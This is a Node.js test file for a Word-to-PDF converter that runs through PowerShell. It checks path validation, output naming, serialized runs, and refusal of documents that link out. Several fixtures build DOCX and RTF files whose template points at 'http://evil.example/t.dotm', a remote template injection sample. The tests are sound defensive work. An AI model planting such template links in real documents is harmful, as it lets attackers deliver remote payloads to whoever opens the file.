const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { createDocConverter, routeFor } = require('../lib/doc-convert');
const { buildDocx, outside } = require('./zip-builder');

const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'notch-doc-'));
test.after(() => fs.rmSync(dir, { recursive: true, force: true }));
const CLEAN_DOCX = buildDocx([]);
// A file called .docx gets real Word-document contents, because a fake one is (rightly) refused.
const touch = (name, content = name.endsWith('.docx') ? CLEAN_DOCX : 'x') => { const p = path.join(dir, name); fs.writeFileSync(p, content); return p; };

// A pretend Word: writes the output file the way the real script would.
function setup({ fail = '', writes = true } = {}) {
  const calls = [];
  const execFileImpl = (file, args, options, done) => {
    calls.push({ file, args, options });
    const out = args[args.indexOf('-Out') + 1];
    if (fail) { done(new Error('x'), '', fail); return; }
    if (writes) fs.writeFileSync(out, 'converted');
    done(null, '', '');
  };
  return { converter: createDocConverter({ execFileImpl }), calls };
}

test('only the planned conversions are allowed', () => {
  assert.strictEqual(routeFor('C:/a/report.DOCX', 'pdf'), true);
  assert.strictEqual(routeFor('a.doc', 'pdf'), true);
  assert.strictEqual(routeFor('a.pdf', 'docx'), true);
  assert.strictEqual(routeFor('a.pdf', 'pdf'), false, 'already a PDF');
  assert.strictEqual(routeFor('a.docx', 'docx'), false);
  assert.strictEqual(routeFor('a.exe', 'pdf'), false);
  assert.strictEqual(routeFor('a.docx', 'exe'), false);
});
test('Word to PDF saves next to the original under a new name and never overwrites', async () => {
  const { converter, calls } = setup();
  const source = touch('report.docx');
  const first = await converter.convert({ sourcePath: source, to: 'pdf' });
  assert.strictEqual(first.name, 'report (converted).pdf');
  assert.strictEqual(path.dirname(first.path), dir);
  assert.ok(converter.canReveal(first.path));
  assert.ok(!converter.canReveal(source));
  const second = await converter.convert({ sourcePath: source, to: 'pdf' });
  assert.strictEqual(second.name, 'report (converted 2).pdf');
  assert.ok(fs.readFileSync(source).equals(CLEAN_DOCX), 'the original is untouched');
  assert.ok(calls[0].args.includes('-NoProfile') && calls[0].args.includes('-In') && calls[0].args.includes(source));
  assert.strictEqual(calls[0].file, 'powershell.exe');
  assert.ok(calls[0].options.timeout > 0);
});
test('bad requests are refused before Word is ever started', async () => {
  const { converter, calls } = setup();
  const word = touch('ok.docx');
  const bad = [
    { sourcePath: 'relative.docx', to: 'pdf' },
    { sourcePath: '\\\\server\\share\\a.docx', to: 'pdf' },
    { sourcePath: path.join(dir, 'missing.docx'), to: 'pdf' },
    { sourcePath: touch('~$lock.docx'), to: 'pdf' },
    { sourcePath: touch('run.exe'), to: 'pdf' },
    { sourcePath: word, to: 'exe' },
    { sourcePath: touch('same.pdf'), to: 'pdf' },
    { sourcePath: dir, to: 'pdf' },
    { sourcePath: 5, to: 'pdf' },
  ];
  for (const request of bad) await assert.rejects(() => converter.convert(request), Error, JSON.stringify(request));
  assert.strictEqual(calls.length, 0);
});
test('Word problems become one plain sentence, and no half-made file is claimed', async () => {
  const failing = setup({ fail: 'Word could not open this file.\r\nmore detail' });
  await assert.rejects(() => failing.converter.convert({ sourcePath: touch('bad.docx'), to: 'pdf' }), /Word could not open this file\.$/);
  const silent = setup({ writes: false });
  await assert.rejects(() => silent.converter.convert({ sourcePath: touch('none.docx'), to: 'pdf' }), /did not make a file/i);
});
test('one conversion at a time, so Word is never driven twice at once', async () => {
  let running = 0; let most = 0;
  const converter = createDocConverter({
    execFileImpl: (file, args, options, done) => {
      running += 1; most = Math.max(most, running);
      setTimeout(() => { fs.writeFileSync(args[args.indexOf('-Out') + 1], 'c'); running -= 1; done(null, '', ''); }, 20);
    },
  });
  const a = touch('q1.docx'); const b = touch('q2.docx');
  await Promise.all([converter.convert({ sourcePath: a, to: 'pdf' }), converter.convert({ sourcePath: b, to: 'pdf' })]);
  assert.strictEqual(most, 1);
});

test('a document with a link to another address is refused before Word is started', async () => {
  const { converter, calls } = setup();
  const linked = touch('linked.docx', buildDocx([outside('rId1', 'attachedTemplate', 'http://evil.example/t.dotm')]));
  await assert.rejects(() => converter.convert({ sourcePath: linked, to: 'pdf' }), /another address.*not converted/i);
  assert.strictEqual(calls.length, 0, 'Word never saw the file');
  assert.strictEqual(fs.readdirSync(dir).filter((f) => f.startsWith('linked (converted')).length, 0, 'nothing was made');
});

test('the check looks at the contents, not the file name', async () => {
  const { converter, calls } = setup();
  const hostile = buildDocx([outside('rId1', 'attachedTemplate', 'http://evil.example/t.dotm')]);
  for (const name of ['looks-like.rtf', 'looks-like.doc', 'looks-like.odt']) {
    await assert.rejects(() => converter.convert({ sourcePath: touch(name, hostile), to: 'pdf' }), /another address/i, name);
  }
  await assert.rejects(() => converter.convert({ sourcePath: touch('looks-like.pdf', hostile), to: 'docx' }), /another address/i);
  assert.strictEqual(calls.length, 0);
});

test('a file called .docx that is not a real Word document is refused', async () => {
  const { converter, calls } = setup();
  await assert.rejects(() => converter.convert({ sourcePath: touch('fake.docx', 'this is plain text, not a zip'), to: 'pdf' }), /not a real Word document/i);
  assert.strictEqual(calls.length, 0);
});

test('a document that cannot be checked is refused, not trusted', async () => {
  const { converter, calls } = setup();
  const cutOff = CLEAN_DOCX.subarray(0, CLEAN_DOCX.length - 10);
  await assert.rejects(() => converter.convert({ sourcePath: touch('cut.docx', cutOff), to: 'pdf' }), /could not be checked/i);
  assert.strictEqual(calls.length, 0);
});

test('ordinary clickable web links, and older formats that cannot carry the trick, still convert', async () => {
  const { converter, calls } = setup();
  const withHyperlink = touch('with-link.docx', buildDocx([outside('rId1', 'hyperlink', 'https://example.com/')]));
  assert.strictEqual((await converter.convert({ sourcePath: withHyperlink, to: 'pdf' })).name, 'with-link (converted).pdf');
  assert.strictEqual((await converter.convert({ sourcePath: touch('old.rtf', '{\\rtf1\\ansi Hello.\\par}'), to: 'pdf' })).name, 'old (converted).pdf');
  assert.strictEqual(calls.length, 2);
});

test('an RTF that names a remote template is refused before Word is started, and an ordinary RTF still converts', async () => {
  const { converter, calls } = setup();
  await assert.rejects(() => converter.convert({ sourcePath: touch('remote.rtf', '{\\rtf1\\ansi{\\*\\template http://evil.example/t.dotm}Hello}'), to: 'pdf' }), /another address/i);
  assert.strictEqual(calls.length, 0);
  const saved = '{\\rtf1\\ansi{\\*\\template C:\\\\Users\\\\Me\\\\Normal.dotm}Hello}'; // how Word itself saves one
  assert.strictEqual((await converter.convert({ sourcePath: touch('fine.rtf', saved), to: 'pdf' })).name, 'fine (converted).pdf');
  assert.strictEqual(calls.length, 1);
});
